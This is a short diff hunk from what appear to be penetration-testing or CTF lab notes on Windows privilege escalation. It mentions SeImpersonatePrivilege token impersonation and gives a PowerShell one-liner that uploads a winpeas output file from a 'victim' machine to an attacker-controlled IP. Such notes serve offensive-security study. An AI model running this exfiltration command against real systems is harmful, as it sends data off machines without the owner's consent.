@@ -104,3 +104,4 @@ BUT -> SeImpersonatePrivilege allows for token impersonation, so we can try to u
 # How to upload a file from the victim machine to the attacker: 
 *on the victim machine with python server on the attacker machine*
 `powershell -Command "(New-Object Net.WebClient).UploadFile('http://10.10.16.54/upload', 'C:\Users\Public\winpeas_output.txt')"`
+
